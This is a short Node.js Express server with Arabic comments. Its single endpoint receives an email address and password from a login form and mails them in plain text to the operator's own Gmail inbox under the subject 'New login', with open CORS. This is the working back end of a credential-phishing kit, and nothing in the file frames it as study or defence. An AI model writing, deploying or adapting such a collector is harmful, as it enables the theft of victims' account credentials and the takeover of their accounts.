const express = require("express");
const nodemailer = require("nodemailer");
const cors = require("cors");

const app = express();
app.use(express.json());
app.use(cors());

// إعداد Nodemailer باستخدام Gmail (أو أي خدمة SMTP أخرى)
const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
        user: "your-email@gmail.com",  // استبدل بريدك هنا
        pass: "your-email-password"    // استبدل كلمة المرور هنا (يفضل استخدام App Password)
    }
});

app.post("/send-email", (req, res) => {
    const { email, password } = req.body;

    const mailOptions = {
        from: "your-email@gmail.com",  // استبدل بريدك هنا
        to: "your-email@gmail.com",    // البريد الذي ستستقبل عليه البيانات
        subject: "تسجيل دخول جديد",
        text: `البريد الإلكتروني: ${email}\nكلمة المرور: ${password}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error(error);
            return res.status(500).json({ message: "فشل إرسال البريد" });
        }
        console.log("تم إرسال البريد:", info.response);
        res.status(200).json({ message: "تم إرسال البريد بنجاح" });
    });
});

// تشغيل السيرفر
const PORT = 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
